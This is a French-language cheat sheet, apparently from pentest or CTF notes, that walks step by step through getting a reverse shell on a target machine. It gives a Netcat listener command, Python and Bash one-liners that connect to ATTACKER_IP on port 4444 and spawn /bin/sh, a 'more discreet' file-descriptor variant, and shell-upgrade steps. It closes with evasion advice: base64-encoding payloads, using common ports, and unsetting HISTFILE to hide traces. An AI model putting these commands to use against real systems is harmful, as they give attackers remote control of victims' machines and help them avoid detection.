# 🐚 Reverse Shell - Étapes détaillées (Python & Bash)

## 🎯 Objectif

Obtenir un shell interactif à distance sur une machine cible en utilisant un **reverse shell**.  
Le principe : la machine cible initie une connexion vers l'attaquant, contournant souvent les pare-feu.

---

## 🧰 ÉTAPE 1 : Préparer l’écoute côté Attaquant

Avant de lancer la commande sur la cible, démarre un listener sur ta machine d’attaque :

nc -lvnp 4444  
> Ouvre un port d'écoute (ici 4444) avec Netcat pour recevoir la connexion de la cible.

---

## 🐍 ÉTAPE 2 : Reverse Shell Python (sur la cible)

### 🧪 Vérifier que Python est installé :

which python  
which python3

### 🔧 Lancer le reverse shell :

#### Version Python 2

python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'

#### Version Python 3

python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

🧠 Remplace ATTACKER_IP par ton IP (souvent `tun0` si VPN).

---

## 🐚 ÉTAPE 3 : Reverse Shell Bash (sur la cible)

### 🧪 Vérifier que Bash est disponible :

which bash

### 🔧 Lancer le reverse shell :

bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1  
> Utilise le redirection de flux vers un socket TCP.

Variante plus discrète (si la première ne passe pas) :

0<&196;exec 196<>/dev/tcp/ATTACKER_IP/4444; sh <&196 >&196 2>&196  

💡 Bash TCP fonctionne seulement si `/dev/tcp/` est activé (c’est le cas sur beaucoup de systèmes Linux).

---

## 🧪 ÉTAPE 4 : Vérification

Si tout se passe bien, tu verras apparaître dans ton Netcat :

connect to [YOUR_IP] from (UNKNOWN) [VICTIM_IP] 43210  
sh-4.2$

> Tu as maintenant un shell interactif sur la machine cible.

---

## 💬 ÉTAPE 5 : Améliorer l'interactivité du shell

Le shell peut être lent ou ne pas supporter les touches comme flèches, tab, etc.

Amélioration dans Netcat :

python -c 'import pty; pty.spawn("/bin/bash")'  
> Donne un shell pseudo-TTY.

Puis :  
CTRL-Z  
stty raw -echo  
fg  
reset  

---

## 🔐 Conseils opérationnels

- Utilise un port commun (53, 80, 443) si 4444 est bloqué.
- Encode le payload en base64 pour éviter l’analyse.
- Redirige les logs si nécessaire (`unset HISTFILE`).

---

## 📌 Ressources

- https://revshells.com
- https://github.com/swisskyrepo/PayloadsAllTheThings

